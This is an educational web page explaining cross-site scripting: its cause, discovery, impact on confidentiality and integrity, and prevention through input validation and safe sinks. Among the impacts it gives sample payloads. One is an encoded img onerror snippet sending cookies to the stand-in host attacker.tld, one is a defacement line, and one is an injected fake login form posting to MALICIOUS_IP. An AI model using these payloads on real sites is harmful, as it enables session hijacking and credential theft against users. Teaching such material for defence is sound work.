<h1>Introduction</h1>
Cross-Site Scripting or XSS is a web vulnerability that allows an attacker to execute code (javascript) from the victim's browser context. It takes advantage of the trust relationship between the victim user and web application in order to execute actions that hurt the organization's CIA security model.
<h2>How the Bug is Born</h2>
XSS bugs stem from unsafe consumption of user-supplied data. Lack of input validation and sanitization, unsafe sinks and the absence of mitigation strategies constitute the aforementioned "consumption of user-supplied data" "unsafe".
<h2>How it gets Discovered</h2>
When a web app fails to clearly separate logic from data (code from plaintext), the supplied input gets interpreted as code. Hence, whenever we are able to identify a point in the application (url parameter, input field, header value, etc.) that injects data into the DOM and that data is interpreted as valid javascript code, we have discovered an XSS bug.
<h2>How it hurts the CIA model</h2>
Cross-Site Scripting bugs expose the vulnerable application via its users. Depending on the XSS type (DOM-based, Reflected, Stored) a different aspect of the app may get compromised. Specifically, javascript code executed via the victim's context can result in:

<ul>
  <li>data exfiltration  <code>&lt;img src&equals;x onerror&equals;&quot;new Image&lpar;&rpar;&period;src&equals;&apos;https&colon;&sol;&sol;attacker&period;tld&sol;&quest;c&equals;&apos;&plus;encodeURIComponent&lpar;document&period;cookie&rpar;&quot;&gt;</code> - Confidentiality</li>
  <li>Leading to session hijacking (stolen cookie) - Confidentiality</li>
  <li>Leading to account takeover - Integrity</li>
  <li>Website defacement <code>document.getElementsByTagName('body')[0].innerHTML = "PAWNED"</code> - Integrity</li>
  <li>Pivoting to CSRF vulns which may also lead to data exfiltration and account takeover - Integrity</li>
  <li>Bonus (although technically not XSS per se): Phishing for credentials via injected forms pointing to attacker controlled server<br><code>&lt;div&gt;&NewLine;&lt;h3&gt;Please login to continue&lt;&sol;h3&gt;&NewLine;&lt;form action&equals;http&colon;&sol;&sol;MALICIOUS&lowbar;IP&gt;&NewLine;    &lt;input type&equals;&quot;username&quot; name&equals;&quot;username&quot; placeholder&equals;&quot;Username&quot;&gt;&NewLine;    &lt;input type&equals;&quot;password&quot; name&equals;&quot;password&quot; placeholder&equals;&quot;Password&quot;&gt;&NewLine;    &lt;input type&equals;&quot;submit&quot; name&equals;&quot;submit&quot; value&equals;&quot;Login&quot;&gt;&NewLine;    &lt;br&gt;&lt;br&gt;&lt;br&gt;&NewLine;&lt;&sol;form&gt;&NewLine;&lt;&sol;div&gt;</code></li>
</ul>
<h3>Sidenote</h3>
It goes without saying that the injected data must be deliverable to another user so that the code executes on the victim's browser context. If we are not able to actually deliver the attack (data not delivered via url parameter, etc.), then we have discovered self-XSS which has little to no significant security implications. 
<h2>How to Prevent and Mitigate</h2>
XSS bugs are prevented via proper input validation + sanitization and via using safe sinks like .textContent and .innerText. Never trust user input and comprehensively separate data from logic within your web application.
